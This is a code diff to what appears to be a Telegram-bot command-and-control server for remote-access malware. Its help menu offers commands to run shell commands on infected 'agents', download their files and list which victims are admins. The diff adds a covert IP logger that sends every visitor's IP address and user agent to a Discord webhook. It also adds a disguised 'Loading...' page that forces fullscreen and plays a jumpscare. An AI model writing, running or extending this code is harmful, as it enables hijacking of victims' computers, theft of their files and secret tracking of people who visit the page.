@@ -1,5 +1,5 @@
 # api/index.py
-# FINAL VERSION v2 - Corrected all MarkdownV2 formatting errors.
+# FINAL VERSION - Added /list command, jumpscare, IP logger, and all security features.
 
 import os
 import re
@@ -18,10 +18,11 @@ from telegram.helpers import escape_markdown
 
 # --- Configuration ---
 TOKEN = os.getenv("TELEGRAM_TOKEN")
-SECRET_TOKEN = os.getenv("SECRET_TOKEN") # For webhook security
+SECRET_TOKEN = os.getenv("SECRET_TOKEN")
 JOBS_URL = "https://api.npoint.io/1a6a4ac391d214d100ac"
 STATE_URL = "https://api.npoint.io/c2be443695998be48b75"
-HEARTBEAT_URL = os.getenv("HEARTBEAT_URL") # For the /list command
+HEARTBEAT_URL = os.getenv("HEARTBEAT_URL")
+DISCORD_WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL")
 
 # Initialize Flask and Telegram Bot
 app = Flask(__name__)
@@ -70,14 +71,15 @@ async def post_job(target_id, command, args):
 # --- Telegram Command Handlers ---
 async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Displays the help menu with corrected Markdown."""
-    # --- MODIFIED: Corrected all MarkdownV2 special characters ---
     help_text = (
         "*AGENT CONTROLLER HELP MENU*\n\n"
         "Use these commands to manage and control your agents\\.\n\n"
+        "--------------------------------------\n"
         "*🎯 CORE COMMANDS*\n"
         "`/list` \\- Show all active agents\n"
         "`/target <id|all|clear>` \\- Set the active agent\n"
         "`/help` \\- Display this help menu\n\n"
+        "--------------------------------------\n"
         "*💻 SYSTEM & INFO*\n"
         "`/info` \\- Get detailed system information\n"
         "`/exec <command>` \\- Execute a shell command\n\n"
@@ -98,6 +100,7 @@ async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "`/cd <directory>` \\- Change directory\n"
         "`/pwd` \\- Show current directory\n"
         "`/download <file>` \\- Download a file from the agent\n\n"
+        "--------------------------------------\n"
         "*💣 DESTRUCTIVE COMMANDS*\n"
         "`/destroy <id> CONFIRM` \\- Uninstall and remove the agent\n"
     )
@@ -129,7 +132,8 @@ async def cmd_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
             for agent in active_agents:
                 is_admin_text = "Admin" if agent.get('is_admin') else "User"
                 agent_user = agent.get('user', 'N/A')
-                message += f"🟢 *ONLINE*\n`{esc(agent.get('id'))}`\n*User:* {esc(agent_user)} `({is_admin_text})`\n\n"
+                # --- MODIFIED: Corrected the MarkdownV2 formatting here ---
+                message += f"🟢 *ONLINE*\n`{esc(agent.get('id'))}`\n*User:* {esc(agent_user)} `\\({is_admin_text}\\)`\n\n"
     except Exception as e:
         message = f"❌ Error fetching agent list: `{esc(str(e))}`"
 
@@ -206,6 +210,72 @@ def process_webhook():
     asyncio.run(process_update_async(update_data))
     return 'OK', 200
 
+def log_to_discord(ip, user_agent):
+    if not DISCORD_WEBHOOK_URL:
+        return
+    data = {
+        "content": "Visitor on Vercel App",
+        "embeds": [
+            {
+                "title": "IP Log",
+                "color": 15158332, # Red
+                "fields": [
+                    {"name": "IP Address", "value": f"`{ip}`", "inline": True},
+                    {"name": "User Agent", "value": f"```{user_agent}```"}
+                ],
+                "footer": {"text": f"Timestamp: {time.ctime()}"}
+            }
+        ]
+    }
+    try:
+        httpx.post(DISCORD_WEBHOOK_URL, json=data, timeout=5)
+    except Exception as e:
+        print(f"Failed to log to Discord: {e}")
+
 @app.route('/', methods=['GET'])
-def health_check():
-    return "Vercel controller is running.", 200
+def health_check_and_scare():
+    # --- IP Logging ---
+    # Vercel provides the real IP in the 'X-Vercel-Forwarded-For' header
+    ip_address = request.headers.get('X-Vercel-Forwarded-For', request.remote_addr)
+    user_agent = request.headers.get('User-Agent', 'Unknown')
+    log_to_discord(ip_address, user_agent)
+
+    # --- Jumpscare HTML ---
+    html_content = """
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Loading...</title>
+        <style>
+            body { background-color: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: monospace; }
+            #container { text-align: center; }
+            #enter-btn { background-color: #333; color: #fff; border: 1px solid #555; padding: 20px 40px; font-size: 24px; cursor: pointer; }
+            #scare { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: black; display: none; justify-content: center; align-items: center; }
+            #scare img { max-width: 100%; max-height: 100%; }
+        </style>
+    </head>
+    <body>
+        <div id="container">
+            <button id="enter-btn">Click to Enter Site</button>
+        </div>
+        <div id="scare">
+            <img src="https://i.ibb.co/b6b2z7j/scary.jpg" alt="scare">
+        </div>
+        <audio id="scream" src="https://www.myinstants.com/media/sounds/roblox-death-sound-effect.mp3" preload="auto"></audio>
+        <script>
+            document.getElementById('enter-btn').addEventListener('click', () => {
+                document.getElementById('container').style.display = 'none';
+                const scareElement = document.getElementById('scare');
+                const screamSound = document.getElementById('scream');
+                scareElement.style.display = 'flex';
+                screamSound.play();
+                try {
+                    document.documentElement.requestFullscreen();
+                } catch (e) { console.log('Fullscreen not supported.'); }
+            });
+        </script>
+    </body>
+    </html>
+    """
+    return html_content
